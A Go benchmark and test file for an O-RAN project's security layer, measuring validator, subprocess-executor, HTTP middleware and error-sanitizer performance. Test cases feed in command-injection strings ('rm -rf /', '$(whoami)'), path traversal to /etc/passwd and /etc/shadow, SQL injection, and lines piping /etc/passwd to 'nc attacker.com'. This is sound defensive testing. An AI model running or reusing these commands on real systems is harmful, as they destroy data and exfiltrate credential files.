// Copyright 2024 O-RAN Intent MANO Project
// SPDX-License-Identifier: Apache-2.0

package security

import (
	"context"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"math"
	"net/http"
	"net/http/httptest"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/thc1006/O-RAN-Intent-MANO-for-Network-Slicing/pkg/security"
)

// SecurityBenchmarkSuite provides comprehensive performance benchmarks for security components
type SecurityBenchmarkSuite struct {
	executor         *security.SecureSubprocessExecutor
	validator        *security.InputValidator
	logger           *TestSecureLogger
	errorHandler     *SecureErrorHandler
	httpServer       *SecureHTTPServer
	memoryBaseline   uint64
	cpuBaseline      float64
	benchmarkResults map[string]BenchmarkResult
	mu               sync.RWMutex
}

type BenchmarkResult struct {
	Name         string
	Duration     time.Duration
	Operations   int
	OpsPerSecond float64
	AllocsPerOp  int64
	BytesPerOp   int64
	CPUUsage     float64
	MemoryUsage  uint64
	ErrorRate    float64
}

type BenchmarkConfig struct {
	Iterations      int
	ConcurrentUsers int
	TestDuration    time.Duration
	PayloadSize     int
	AttackIntensity float64 // 0.0 to 1.0
}

func NewSecurityBenchmarkSuite() *SecurityBenchmarkSuite {
	logger := NewTestSecureLogger()
	return &SecurityBenchmarkSuite{
		executor:         security.NewSecureSubprocessExecutor(),
		validator:        security.NewInputValidator(),
		logger:           logger,
		errorHandler:     NewSecureErrorHandler(logger),
		httpServer:       NewSecureHTTPServer(DefaultSecurityConfig()),
		benchmarkResults: make(map[string]BenchmarkResult),
	}
}

func (s *SecurityBenchmarkSuite) SetBaseline() {
	var memStats runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&memStats)
	s.memoryBaseline = memStats.Alloc

	// Simple CPU baseline measurement
	start := time.Now()
	for i := 0; i < 1000000; i++ {
		_ = i * i
	}
	s.cpuBaseline = time.Since(start).Seconds()
}

func (s *SecurityBenchmarkSuite) RecordResult(name string, result BenchmarkResult) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.benchmarkResults[name] = result
}

func (s *SecurityBenchmarkSuite) GetResults() map[string]BenchmarkResult {
	s.mu.RLock()
	defer s.mu.RUnlock()
	results := make(map[string]BenchmarkResult)
	for k, v := range s.benchmarkResults {
		results[k] = v
	}
	return results
}

// BenchmarkInputValidationPerformance benchmarks input validation performance
func BenchmarkInputValidationPerformance(b *testing.B) {
	suite := NewSecurityBenchmarkSuite()
	suite.SetBaseline()

	b.Run("ValidateCommandArgument", func(b *testing.B) {
		testCases := []struct {
			name  string
			input string
		}{
			{"legitimate_short", "test"},
			{"legitimate_medium", "test_argument_with_some_length"},
			{"legitimate_long", strings.Repeat("legitimate_arg_", 10)},
			{"malicious_short", "test;rm"},
			{"malicious_medium", "test; rm -rf /tmp/*"},
			{"malicious_long", strings.Repeat("malicious;", 50)},
		}

		for _, tc := range testCases {
			b.Run(tc.name, func(b *testing.B) {
				b.ResetTimer()
				for i := 0; i < b.N; i++ {
					if err := suite.validator.ValidateCommandArgument(tc.input); err != nil {
						// Error expected for malicious inputs in benchmark
						_ = err
					}
				}
			})
		}
	})

	b.Run("ValidateIPAddress", func(b *testing.B) {
		testCases := []struct {
			name  string
			input string
		}{
			{"valid_ipv4", "192.168.1.1"},
			{"valid_ipv6", "2001:db8::1"},
			{"malicious_ipv4", "192.168.1.1; cat /etc/passwd"},
			{"malicious_ipv6", "::1 && rm -rf /"},
			{"invalid_format", "999.999.999.999"},
		}

		for _, tc := range testCases {
			b.Run(tc.name, func(b *testing.B) {
				b.ResetTimer()
				for i := 0; i < b.N; i++ {
					if err := suite.validator.ValidateIPAddress(tc.input); err != nil {
						// Error expected for malicious inputs in benchmark
						_ = err
					}
				}
			})
		}
	})

	b.Run("ValidateFilePath", func(b *testing.B) {
		testCases := []struct {
			name  string
			input string
		}{
			{"legitimate_relative", "test/file.txt"},
			{"legitimate_absolute", "/tmp/test.txt"},
			{"path_traversal_simple", "../../../etc/passwd"},
			{"path_traversal_complex", "logs/../../../etc/passwd"},
			{"path_traversal_encoded", "..%2F..%2F..%2Fetc%2Fpasswd"},
		}

		for _, tc := range testCases {
			b.Run(tc.name, func(b *testing.B) {
				b.ResetTimer()
				for i := 0; i < b.N; i++ {
					if err := suite.validator.ValidateFilePath(tc.input); err != nil {
						// Error expected for malicious inputs in benchmark
						_ = err
					}
				}
			})
		}
	})

	b.Run("ValidateNetworkInterface", func(b *testing.B) {
		testCases := []struct {
			name  string
			input string
		}{
			{"valid_ethernet", "eth0"},
			{"valid_bridge", "br0"},
			{"valid_docker", "docker0"},
			{"malicious_injection", "eth0; rm -rf /"},
			{"buffer_overflow", strings.Repeat("a", 1000)},
		}

		for _, tc := range testCases {
			b.Run(tc.name, func(b *testing.B) {
				b.ResetTimer()
				for i := 0; i < b.N; i++ {
					if err := suite.validator.ValidateNetworkInterface(tc.input); err != nil {
						// Error expected for malicious inputs in benchmark
						_ = err
					}
				}
			})
		}
	})
}

// BenchmarkCommandExecutionSecurity benchmarks secure command execution
func BenchmarkCommandExecutionSecurity(b *testing.B) {
	suite := NewSecurityBenchmarkSuite()
	ctx := context.Background()

	b.Run("SecureExecute_Legitimate", func(b *testing.B) {
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			if _, err := suite.executor.SecureExecute(ctx, "ping", "-c", "1", "127.0.0.1"); err != nil {
				// Error handling for benchmark testing
				_ = err
			}
		}
	})

	b.Run("SecureExecute_Validation_Overhead", func(b *testing.B) {
		maliciousArgs := []string{"-c", "1", "127.0.0.1; rm -rf /"}
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			if _, err := suite.executor.SecureExecute(ctx, "ping", maliciousArgs...); err != nil {
				// Error expected for malicious args in benchmark
				_ = err
			}
		}
	})

	b.Run("ArgumentValidation_Batch", func(b *testing.B) {
		args := []string{"-c", "1", "-W", "5", "127.0.0.1"}

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			// Test argument validation through SecureExecute (which internally calls validateArguments)
			_, err := suite.executor.SecureExecute(context.Background(), "ping", args...)
			// We don't care about the result, just the validation performance
			_ = err
		}
	})

	b.Run("CommandTimeout_Performance", func(b *testing.B) {
		shortCmd := &security.AllowedCommand{
			Command:     "echo",
			AllowedArgs: map[string]bool{},
			MaxArgs:     5,
			Timeout:     100 * time.Millisecond,
		}
		if err := suite.executor.RegisterCommand(shortCmd); err != nil {
			b.Fatalf("Failed to register command: %v", err)
		}

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			if _, err := suite.executor.SecureExecute(ctx, "echo", "test"); err != nil {
				// Error handling for benchmark testing
				_ = err
			}
		}
	})
}

// BenchmarkHTTPSecurityPerformance benchmarks HTTP security middleware performance
func BenchmarkHTTPSecurityPerformance(b *testing.B) {
	suite := NewSecurityBenchmarkSuite()

	b.Run("SecurityMiddleware_Overhead", func(b *testing.B) {
		req := httptest.NewRequest("GET", "/health", nil)

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			w := httptest.NewRecorder()
			suite.httpServer.router.ServeHTTP(w, req)
		}
	})

	b.Run("RequestSizeValidation", func(b *testing.B) {
		// Test with different request sizes
		testSizes := []int{1024, 10240, 102400} // 1KB, 10KB, 100KB

		for _, size := range testSizes {
			b.Run(fmt.Sprintf("size_%dB", size), func(b *testing.B) {
				body := strings.Repeat("x", size)
				req := httptest.NewRequest("PUT", "/config", strings.NewReader(body))
				req.Header.Set("Content-Type", "application/json")

				b.ResetTimer()
				for i := 0; i < b.N; i++ {
					w := httptest.NewRecorder()
					suite.httpServer.router.ServeHTTP(w, req)
				}
			})
		}
	})

	b.Run("RateLimiting_Performance", func(b *testing.B) {
		req := httptest.NewRequest("GET", "/health", nil)
		req.RemoteAddr = "192.168.1.100:12345"

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			w := httptest.NewRecorder()
			suite.httpServer.router.ServeHTTP(w, req)
		}
	})

	b.Run("CORS_Validation", func(b *testing.B) {
		req := httptest.NewRequest("GET", "/health", nil)
		req.Header.Set("Origin", "https://example.com")

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			w := httptest.NewRecorder()
			suite.httpServer.router.ServeHTTP(w, req)
		}
	})

	b.Run("SecurityHeaders_Injection", func(b *testing.B) {
		req := httptest.NewRequest("GET", "/health", nil)

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			w := httptest.NewRecorder()
			suite.httpServer.securityHeadersMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				w.WriteHeader(http.StatusOK)
			})).ServeHTTP(w, req)
		}
	})
}

// BenchmarkErrorHandlingPerformance benchmarks error handling and logging performance
func BenchmarkErrorHandlingPerformance(b *testing.B) {
	suite := NewSecurityBenchmarkSuite()

	b.Run("ErrorHandling_Simple", func(b *testing.B) {
		err := fmt.Errorf("simple test error")
		context := map[string]interface{}{"test": "benchmark"}

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			if handledErr := suite.errorHandler.HandleError(err, context); handledErr != nil {
				// Error handling in benchmark
				_ = handledErr
			}
		}
	})

	b.Run("ErrorHandling_WithSensitiveData", func(b *testing.B) {
		err := fmt.Errorf("error with password=secret123 and token=abc123def456")
		context := map[string]interface{}{
			"password": "secret123",
			"token":    "abc123def456",
			"user":     "testuser",
		}

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			if handledErr := suite.errorHandler.HandleError(err, context); handledErr != nil {
				// Error handling in benchmark
				_ = handledErr
			}
		}
	})

	b.Run("ErrorSanitization_Performance", func(b *testing.B) {
		maliciousError := "Error occurred: SQL injection attempt '; DROP TABLE users; -- password=admin123"

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			suite.errorHandler.sanitizeErrorMessage(maliciousError)
		}
	})

	b.Run("Logging_Performance", func(b *testing.B) {
		logData := map[string]interface{}{
			"timestamp": time.Now(),
			"user":      "testuser",
			"action":    "benchmark_test",
			"result":    "success",
		}

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			suite.logger.Log(INFO, "Benchmark test log entry", logData)
		}
	})

	b.Run("SensitiveDataDetection", func(b *testing.B) {
		sensitiveData := map[string]interface{}{
			"password":    "secret123",
			"token":       "abc123def456",
			"credit_card": "4111-1111-1111-1111",
			"ssn":         "123-45-6789",
		}

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			suite.logger.containsSensitiveData("User login attempt", sensitiveData)
		}
	})
}

// BenchmarkConcurrentSecurityOperations benchmarks performance under concurrent load
func BenchmarkConcurrentSecurityOperations(b *testing.B) {
	suite := NewSecurityBenchmarkSuite()

	concurrencyLevels := []int{1, 10, 50, 100}

	for _, concurrency := range concurrencyLevels {
		b.Run(fmt.Sprintf("ValidationConcurrency_%d", concurrency), func(b *testing.B) {
			b.SetParallelism(concurrency)
			b.RunParallel(func(pb *testing.PB) {
				i := 0
				for pb.Next() {
					arg := fmt.Sprintf("test_arg_%d", i%1000)
					if err := suite.validator.ValidateCommandArgument(arg); err != nil {
						// Error expected for some inputs in benchmark
						_ = err
					}
					i++
				}
			})
		})

		b.Run(fmt.Sprintf("HTTPConcurrency_%d", concurrency), func(b *testing.B) {
			req := httptest.NewRequest("GET", "/health", nil)

			b.SetParallelism(concurrency)
			b.RunParallel(func(pb *testing.PB) {
				for pb.Next() {
					w := httptest.NewRecorder()
					suite.httpServer.router.ServeHTTP(w, req)
				}
			})
		})

		b.Run(fmt.Sprintf("ErrorHandlingConcurrency_%d", concurrency), func(b *testing.B) {
			err := fmt.Errorf("concurrent test error")
			context := map[string]interface{}{"test": "concurrent"}

			b.SetParallelism(concurrency)
			b.RunParallel(func(pb *testing.PB) {
				for pb.Next() {
					if handledErr := suite.errorHandler.HandleError(err, context); handledErr != nil {
						// Error handling in benchmark
						_ = handledErr
					}
				}
			})
		})
	}
}

// BenchmarkMemoryUsageUnderAttack benchmarks memory usage during simulated attacks
func BenchmarkMemoryUsageUnderAttack(b *testing.B) {
	suite := NewSecurityBenchmarkSuite()

	b.Run("BufferOverflowAttack", func(b *testing.B) {
		var memBefore, memAfter runtime.MemStats

		// Measure memory before
		runtime.GC()
		runtime.ReadMemStats(&memBefore)

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			longInput := strings.Repeat("A", 10000)
			if err := suite.validator.ValidateCommandArgument(longInput); err != nil {
				// Error expected for malicious inputs in benchmark
				_ = err
			}
		}

		// Measure memory after
		runtime.GC()
		runtime.ReadMemStats(&memAfter)

		b.Logf("Memory usage - Before: %d KB, After: %d KB, Diff: %d KB",
			memBefore.Alloc/1024, memAfter.Alloc/1024, (memAfter.Alloc-memBefore.Alloc)/1024)
	})

	b.Run("RepeatedMaliciousRequests", func(b *testing.B) {
		maliciousInputs := []string{
			"test; rm -rf /",
			"192.168.1.1; cat /etc/passwd",
			"../../../etc/passwd",
			strings.Repeat("attack", 1000),
		}

		var memBefore, memAfter runtime.MemStats
		runtime.GC()
		runtime.ReadMemStats(&memBefore)

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			input := maliciousInputs[i%len(maliciousInputs)]
			if err := suite.validator.ValidateCommandArgument(input); err != nil {
				// Error expected for malicious inputs in benchmark
				_ = err
			}
			if err := suite.validator.ValidateIPAddress(input); err != nil {
				// Error expected for malicious inputs in benchmark
				_ = err
			}
			if err := suite.validator.ValidateFilePath(input); err != nil {
				// Error expected for malicious inputs in benchmark
				_ = err
			}
		}

		runtime.GC()
		runtime.ReadMemStats(&memAfter)

		b.Logf("Memory usage under attack - Before: %d KB, After: %d KB, Diff: %d KB",
			memBefore.Alloc/1024, memAfter.Alloc/1024, (memAfter.Alloc-memBefore.Alloc)/1024)
	})

	b.Run("LargePayloadHandling", func(b *testing.B) {
		// Test handling of large JSON payloads
		largePayload := make(map[string]interface{})
		for i := 0; i < 1000; i++ {
			largePayload[fmt.Sprintf("key_%d", i)] = strings.Repeat("value", 100)
		}

		payloadJSON, _ := json.Marshal(largePayload)

		var memBefore, memAfter runtime.MemStats
		runtime.GC()
		runtime.ReadMemStats(&memBefore)

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			req := httptest.NewRequest("PUT", "/config", strings.NewReader(string(payloadJSON)))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()
			suite.httpServer.router.ServeHTTP(w, req)
		}

		runtime.GC()
		runtime.ReadMemStats(&memAfter)

		b.Logf("Memory usage with large payloads - Before: %d KB, After: %d KB, Diff: %d KB",
			memBefore.Alloc/1024, memAfter.Alloc/1024, (memAfter.Alloc-memBefore.Alloc)/1024)
	})
}

// BenchmarkSecurityVsFunctionality benchmarks security overhead vs. functionality
func BenchmarkSecurityVsFunctionality(b *testing.B) {
	suite := NewSecurityBenchmarkSuite()

	// Compare secured vs unsecured operations
	b.Run("SecuredCommandValidation", func(b *testing.B) {
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			if err := suite.validator.ValidateCommandArgument("test_command_arg"); err != nil {
				// Error handling for benchmark testing
				_ = err
			}
		}
	})

	b.Run("UnsecuredStringComparison", func(b *testing.B) {
		// Simulate what unsecured validation might look like
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			arg := "test_command_arg"
			_ = len(arg) > 0 && len(arg) < 1000 // Basic length check only
		}
	})

	b.Run("SecuredHTTPRequest", func(b *testing.B) {
		req := httptest.NewRequest("GET", "/health", nil)

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			w := httptest.NewRecorder()
			suite.httpServer.router.ServeHTTP(w, req)
		}
	})

	b.Run("UnsecuredHTTPRequest", func(b *testing.B) {
		// Simulate unsecured HTTP handler
		handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusOK)
			if _, err := w.Write([]byte(`{"status":"ok"}`)); err != nil {
				// Error writing response in benchmark
				_ = err
			}
		})

		req := httptest.NewRequest("GET", "/health", nil)

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			w := httptest.NewRecorder()
			handler.ServeHTTP(w, req)
		}
	})
}

// BenchmarkRegexPerformance benchmarks regex-heavy validation performance
func BenchmarkRegexPerformance(b *testing.B) {
	// Test performance of regex-based validations
	testPatterns := []struct {
		name    string
		input   string
		pattern string
	}{
		{
			name:    "simple_alphanumeric",
			input:   "test123",
			pattern: `^[a-zA-Z0-9]+$`,
		},
		{
			name:    "complex_command_injection",
			input:   "test; rm -rf /",
			pattern: `[;&|<>` + "`" + `$(){}[\]\\]`,
		},
		{
			name:    "ip_address_validation",
			input:   "192.168.1.1",
			pattern: `^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`,
		},
		{
			name:    "path_traversal_detection",
			input:   "../../../etc/passwd",
			pattern: `\.\.[\\/]`,
		},
	}

	// Pre-compile all regex patterns once
	compiledPatterns := make([]*regexp.Regexp, len(testPatterns))
	for i, tp := range testPatterns {
		compiledPatterns[i] = regexp.MustCompile(tp.pattern)
	}

	for i, tp := range testPatterns {
		b.Run(tp.name, func(b *testing.B) {
			b.ResetTimer()
			for j := 0; j < b.N; j++ {
				matched := compiledPatterns[i].MatchString(tp.input)
				_ = matched
			}
		})
	}

	// Compare with validation functions
	b.Run("ValidationFunction_vs_Regex", func(b *testing.B) {
		input := "test; rm -rf /"

		b.Run("regex_approach", func(b *testing.B) {
			dangerousRegex := regexp.MustCompile(`[;&|<>` + "`" + `$(){}[\]\\]`)
			b.ResetTimer()
			for i := 0; i < b.N; i++ {
				matched := dangerousRegex.MatchString(input)
				_ = matched
			}
		})

		b.Run("string_contains_approach", func(b *testing.B) {
			dangerousChars := []string{";", "&", "|", "<", ">", "`", "$", "(", ")", "{", "}", "[", "]", "\\"}
			b.ResetTimer()
			for i := 0; i < b.N; i++ {
				found := false
				for _, char := range dangerousChars {
					if strings.Contains(input, char) {
						found = true
						break
					}
				}
				_ = found
			}
		})
	})
}

// BenchmarkCryptographicOperations benchmarks security-related crypto operations
func BenchmarkCryptographicOperations(b *testing.B) {
	b.Run("RandomDataGeneration", func(b *testing.B) {
		buffer := make([]byte, 32)
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			if _, err := rand.Read(buffer); err != nil {
				b.Fatalf("Failed to read random data: %v", err)
			}
		}
	})

	b.Run("StringHashing_Simple", func(b *testing.B) {
		input := "test_string_to_hash"
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			// Simple hash for rate limiting
			hash := 0
			for _, char := range input {
				hash = hash*31 + int(char)
			}
			_ = hash
		}
	})

	b.Run("StringHashing_Complex", func(b *testing.B) {
		input := "test_string_to_hash_with_more_complexity"
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			// More complex hash calculation
			hash := uint64(0)
			for i, char := range input {
				hash = hash*uint64(31) + uint64(char) + uint64(i)
			}
			_ = hash
		}
	})
}

// BenchmarkWorstCaseScenarios benchmarks worst-case security scenarios
func BenchmarkWorstCaseScenarios(b *testing.B) {
	suite := NewSecurityBenchmarkSuite()

	b.Run("MaximumInputSize", func(b *testing.B) {
		// Test with maximum allowed input size
		maxInput := strings.Repeat("A", 10000) // Assuming 10KB max
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			if err := suite.validator.ValidateCommandArgument(maxInput); err != nil {
				// Error expected for maximum input size in benchmark
				_ = err
			}
		}
	})

	b.Run("ComplexMaliciousInput", func(b *testing.B) {
		// Complex malicious input with multiple attack vectors
		maliciousInput := "test; rm -rf / && cat /etc/passwd | nc attacker.com 1234 & $(whoami) `id` ../../../etc/shadow"
		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			if err := suite.validator.ValidateCommandArgument(maliciousInput); err != nil {
				// Error expected for malicious input in benchmark
				_ = err
			}
		}
	})

	b.Run("RepeatedSecurityViolations", func(b *testing.B) {
		// Simulate attacker repeatedly trying the same attack
		attacks := []string{
			"test; rm -rf /",
			"test && cat /etc/passwd",
			"test | nc attacker.com 1234",
			"test$(whoami)",
			"test`id`",
		}

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			attack := attacks[i%len(attacks)]
			if err := suite.validator.ValidateCommandArgument(attack); err != nil {
				// Error expected for attack input in benchmark
				_ = err
			}
		}
	})

	b.Run("UnicodeSecurityBypass", func(b *testing.B) {
		// Test performance with unicode-based bypass attempts
		unicodeAttacks := []string{
			"test\u003Brm -rf /",        // Unicode semicolon
			"test\u007Ccat /etc/passwd", // Unicode pipe
			"test\u0026rm -rf /",        // Unicode ampersand
		}

		b.ResetTimer()
		for i := 0; i < b.N; i++ {
			attack := unicodeAttacks[i%len(unicodeAttacks)]
			if err := suite.validator.ValidateCommandArgument(attack); err != nil {
				// Error expected for attack input in benchmark
				_ = err
			}
		}
	})
}

// TestSecurityPerformanceRegression tests for performance regressions
func TestSecurityPerformanceRegression(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping performance regression tests in short mode")
	}

	suite := NewSecurityBenchmarkSuite()
	suite.SetBaseline()

	// Define performance thresholds (these should be calibrated based on your requirements)
	thresholds := map[string]time.Duration{
		"command_validation": 1 * time.Millisecond,
		"ip_validation":      500 * time.Microsecond,
		"path_validation":    800 * time.Microsecond,
		"http_request":       5 * time.Millisecond,
		"error_handling":     2 * time.Millisecond,
	}

	testCases := []struct {
		name      string
		operation func() time.Duration
		threshold time.Duration
	}{
		{
			name: "command_validation",
			operation: func() time.Duration {
				start := time.Now()
				for i := 0; i < 1000; i++ {
					if err := suite.validator.ValidateCommandArgument("test_arg"); err != nil {
						// Error handling in regression test
						_ = err
					}
				}
				return time.Since(start) / 1000
			},
			threshold: thresholds["command_validation"],
		},
		{
			name: "ip_validation",
			operation: func() time.Duration {
				start := time.Now()
				for i := 0; i < 1000; i++ {
					if err := suite.validator.ValidateIPAddress("192.168.1.1"); err != nil {
						// Error handling in regression test
						_ = err
					}
				}
				return time.Since(start) / 1000
			},
			threshold: thresholds["ip_validation"],
		},
		{
			name: "path_validation",
			operation: func() time.Duration {
				start := time.Now()
				for i := 0; i < 1000; i++ {
					if err := suite.validator.ValidateFilePath("/tmp/test.txt"); err != nil {
						// Error handling in regression test
						_ = err
					}
				}
				return time.Since(start) / 1000
			},
			threshold: thresholds["path_validation"],
		},
		{
			name: "http_request",
			operation: func() time.Duration {
				req := httptest.NewRequest("GET", "/health", nil)
				start := time.Now()
				for i := 0; i < 100; i++ {
					w := httptest.NewRecorder()
					suite.httpServer.router.ServeHTTP(w, req)
				}
				return time.Since(start) / 100
			},
			threshold: thresholds["http_request"],
		},
		{
			name: "error_handling",
			operation: func() time.Duration {
				err := fmt.Errorf("test error")
				context := map[string]interface{}{"test": "regression"}
				start := time.Now()
				for i := 0; i < 1000; i++ {
					if handledErr := suite.errorHandler.HandleError(err, context); handledErr != nil {
						// Error handling in benchmark
						_ = handledErr
					}
				}
				return time.Since(start) / 1000
			},
			threshold: thresholds["error_handling"],
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Run operation multiple times to get average
			var totalTime time.Duration
			runs := 5

			for i := 0; i < runs; i++ {
				duration := tc.operation()
				totalTime += duration
			}

			avgTime := totalTime / time.Duration(runs)

			t.Logf("Operation %s: Average time %v, Threshold %v", tc.name, avgTime, tc.threshold)

			if avgTime > tc.threshold {
				t.Errorf("Performance regression detected for %s: %v > %v (%.2f%% slower)",
					tc.name, avgTime, tc.threshold,
					float64(avgTime-tc.threshold)/float64(tc.threshold)*100)
			}
		})
	}
}

// TestSecurityResourceLimits tests resource consumption under load
func TestSecurityResourceLimits(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping resource limit tests in short mode")
	}

	suite := NewSecurityBenchmarkSuite()

	t.Run("memory_consumption_limits", func(t *testing.T) {
		var memBefore, memAfter runtime.MemStats

		runtime.GC()
		runtime.ReadMemStats(&memBefore)

		// Simulate heavy load
		for i := 0; i < 10000; i++ {
			maliciousInput := strings.Repeat("malicious;", 100)
			if err := suite.validator.ValidateCommandArgument(maliciousInput); err != nil {
				// Error expected for malicious input in benchmark
				_ = err
			}
			if err := suite.validator.ValidateIPAddress("192.168.1.1; attack"); err != nil {
				// Error expected for malicious IP in resource limit test
				_ = err
			}
			if err := suite.validator.ValidateFilePath("../../../etc/passwd"); err != nil {
				// Error expected for malicious path in resource limit test
				_ = err
			}

			// Force garbage collection periodically
			if i%1000 == 0 {
				runtime.GC()
			}
		}

		runtime.GC()
		runtime.ReadMemStats(&memAfter)

		memoryIncrease := memAfter.Alloc - memBefore.Alloc
		memoryIncreaseKB := memoryIncrease / 1024

		t.Logf("Memory consumption: Before %d KB, After %d KB, Increase %d KB",
			memBefore.Alloc/1024, memAfter.Alloc/1024, memoryIncreaseKB)

		// Memory increase should be reasonable (less than 10MB)
		require.True(t, memoryIncreaseKB < 10*1024,
			"Memory consumption should be bounded: %d KB", memoryIncreaseKB)
	})

	t.Run("cpu_usage_under_attack", func(t *testing.T) {
		start := time.Now()

		// Simulate CPU-intensive attack
		for i := 0; i < 50000; i++ {
			complexMaliciousInput := fmt.Sprintf("test_%d; rm -rf / && cat /etc/passwd | nc attacker.com %d", i, i%65535)
			if err := suite.validator.ValidateCommandArgument(complexMaliciousInput); err != nil {
				// Error expected for complex malicious input in resource limit test
				_ = err
			}
		}

		duration := time.Since(start)
		opsPerSecond := 50000 / duration.Seconds()

		t.Logf("CPU performance under attack: %d ops in %v (%.0f ops/sec)",
			50000, duration, opsPerSecond)

		// Should maintain reasonable performance even under attack
		require.True(t, opsPerSecond > 1000,
			"Should maintain at least 1000 ops/sec under attack: %.0f", opsPerSecond)
	})

	t.Run("goroutine_leak_detection", func(t *testing.T) {
		initialGoroutines := runtime.NumGoroutine()

		// Perform operations that might leak goroutines
		var wg sync.WaitGroup
		for i := 0; i < 100; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()
				for j := 0; j < 10; j++ {
					if err := suite.validator.ValidateCommandArgument(fmt.Sprintf("test_%d_%d", id, j)); err != nil {
						// Error handling in goroutine leak test
						_ = err
					}
					time.Sleep(1 * time.Millisecond)
				}
			}(i)
		}

		wg.Wait()
		time.Sleep(100 * time.Millisecond) // Allow goroutines to cleanup

		finalGoroutines := runtime.NumGoroutine()
		goroutineDiff := finalGoroutines - initialGoroutines

		t.Logf("Goroutine count: Initial %d, Final %d, Difference %d",
			initialGoroutines, finalGoroutines, goroutineDiff)

		// Should not leak significant number of goroutines
		require.True(t, goroutineDiff < 10,
			"Should not leak goroutines: %d", goroutineDiff)
	})
}

// BenchmarkComparisonReport generates a comprehensive performance report
func BenchmarkComparisonReport(b *testing.B) {
	suite := NewSecurityBenchmarkSuite()

	// Comprehensive benchmark covering all major components
	benchmarks := []struct {
		name string
		fn   func(b *testing.B)
	}{
		{"InputValidation", func(b *testing.B) {
			for i := 0; i < b.N; i++ {
				if err := suite.validator.ValidateCommandArgument("test_arg"); err != nil {
					// Error handling in benchmark comparison report
					_ = err
				}
			}
		}},
		{"MaliciousInputValidation", func(b *testing.B) {
			for i := 0; i < b.N; i++ {
				if err := suite.validator.ValidateCommandArgument("test; rm -rf /"); err != nil {
					// Error expected for malicious input in benchmark comparison report
					_ = err
				}
			}
		}},
		{"HTTPSecurityMiddleware", func(b *testing.B) {
			req := httptest.NewRequest("GET", "/health", nil)
			for i := 0; i < b.N; i++ {
				w := httptest.NewRecorder()
				suite.httpServer.router.ServeHTTP(w, req)
			}
		}},
		{"ErrorHandling", func(b *testing.B) {
			err := fmt.Errorf("test error")
			context := map[string]interface{}{"test": "benchmark"}
			for i := 0; i < b.N; i++ {
				if handledErr := suite.errorHandler.HandleError(err, context); handledErr != nil {
					// Error handling in benchmark
					_ = handledErr
				}
			}
		}},
		{"ConcurrentValidation", func(b *testing.B) {
			b.SetParallelism(10)
			b.RunParallel(func(pb *testing.PB) {
				i := 0
				for pb.Next() {
					if err := suite.validator.ValidateCommandArgument(fmt.Sprintf("test_%d", i)); err != nil {
						// Error handling in concurrent validation test
						_ = err
					}
					i++
				}
			})
		}},
	}

	for _, benchmark := range benchmarks {
		b.Run(benchmark.name, benchmark.fn)
	}
}

// calculatePerformanceScore calculates a performance score based on multiple metrics
func calculatePerformanceScore(results map[string]BenchmarkResult) float64 { // nolint:unused // TODO: implement performance scoring
	if len(results) == 0 {
		return 0.0
	}

	var totalScore float64
	for _, result := range results {
		// Score based on operations per second (higher is better)
		opsScore := math.Log10(result.OpsPerSecond + 1)

		// Penalty for high memory usage
		memoryPenalty := math.Log10(float64(result.BytesPerOp + 1))

		// Penalty for high allocation rate
		allocPenalty := math.Log10(float64(result.AllocsPerOp + 1))

		score := opsScore - (memoryPenalty * 0.1) - (allocPenalty * 0.1)
		totalScore += score
	}

	return totalScore / float64(len(results))
}
